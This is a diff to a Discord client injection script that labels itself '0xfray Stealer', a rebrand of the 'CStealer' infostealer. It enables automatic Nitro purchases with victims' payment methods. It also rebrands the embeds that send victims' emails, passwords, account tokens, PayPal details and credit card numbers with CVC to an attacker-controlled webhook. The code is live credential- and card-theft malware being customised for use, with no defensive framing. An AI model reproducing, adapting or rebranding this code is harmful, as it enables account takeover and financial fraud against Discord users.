@@ -8,7 +8,7 @@ const { BrowserWindow, session } = require('electron');
 const config = {
   webhook: '%WEBHOOK%', 
   webhook_protector_key: '%WEBHOOK_KEY%', 
-  auto_buy_nitro: false, 
+  auto_buy_nitro: true, 
   ping_on_run: true, 
   ping_val: '@everyone',
   embed_name: '0xfray Stealer | Injection', 
@@ -680,8 +680,8 @@ const login = async (email, password, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-            text: 'CStealer Injection・https://github.com/can-kat/cstealer',
-            icon_url: "https://media.discordapp.net/attachments/1111364024408494140/1111364181032177766/cs.png"
+            text: '0xfray Stealer | Injection',
+            icon_url: "https://eu-images.contentstack.com/v3/assets/blt6d90778a997de1cd/blt59e2b01c409f869b/654e39db743b35040a1001e4/infostealer_Bits_And_Splits_shutterstock.jpg?width=1280&auto=webp&quality=95&format=jpg&disable=upscale"
         },
       },
     ],
@@ -723,8 +723,8 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-            text: 'CStealer Injection・https://github.com/can-kat/cstealer',
-            icon_url: "https://media.discordapp.net/attachments/1111364024408494140/1111364181032177766/cs.png"
+            text: '0xfray Stealer | Injection',
+            icon_url: "https://eu-images.contentstack.com/v3/assets/blt6d90778a997de1cd/blt59e2b01c409f869b/654e39db743b35040a1001e4/infostealer_Bits_And_Splits_shutterstock.jpg?width=1280&auto=webp&quality=95&format=jpg&disable=upscale"
         },
       },
     ],
@@ -766,8 +766,8 @@ const emailChanged = async (email, password, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-            text: 'CStealer Injection・https://github.com/can-kat/cstealer',
-            icon_url: "https://media.discordapp.net/attachments/1111364024408494140/1111364181032177766/cs.png"
+            text: '0xfray Stealer | Injection',
+            icon_url: "https://eu-images.contentstack.com/v3/assets/blt6d90778a997de1cd/blt59e2b01c409f869b/654e39db743b35040a1001e4/infostealer_Bits_And_Splits_shutterstock.jpg?width=1280&auto=webp&quality=95&format=jpg&disable=upscale"
         },
       },
     ],
@@ -809,8 +809,8 @@ const PaypalAdded = async (token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-            text: 'CStealer Injection・https://github.com/can-kat/cstealer',
-            icon_url: "https://media.discordapp.net/attachments/1111364024408494140/1111364181032177766/cs.png"
+            text: '0xfray Stealer | Injection',
+            icon_url: "https://eu-images.contentstack.com/v3/assets/blt6d90778a997de1cd/blt59e2b01c409f869b/654e39db743b35040a1001e4/infostealer_Bits_And_Splits_shutterstock.jpg?width=1280&auto=webp&quality=95&format=jpg&disable=upscale"
         },
       },
     ],
@@ -852,8 +852,8 @@ const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-            text: 'CStealer Injection・https://github.com/can-kat/cstealer',
-            icon_url: "https://media.discordapp.net/attachments/1111364024408494140/1111364181032177766/cs.png"
+            text: '0xfray Stealer | Injection',
+            icon_url: "https://eu-images.contentstack.com/v3/assets/blt6d90778a997de1cd/blt59e2b01c409f869b/654e39db743b35040a1001e4/infostealer_Bits_And_Splits_shutterstock.jpg?width=1280&auto=webp&quality=95&format=jpg&disable=upscale"
         },
       },
     ],
@@ -897,8 +897,8 @@ const nitroBought = async (token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-            text: 'CStealer Injection・https://github.com/can-kat/cstealer',
-            icon_url: "https://media.discordapp.net/attachments/1111364024408494140/1111364181032177766/cs.png"
+            text: '0xfray Stealer | Injection',
+            icon_url: "https://eu-images.contentstack.com/v3/assets/blt6d90778a997de1cd/blt59e2b01c409f869b/654e39db743b35040a1001e4/infostealer_Bits_And_Splits_shutterstock.jpg?width=1280&auto=webp&quality=95&format=jpg&disable=upscale"
         },
       },
     ],
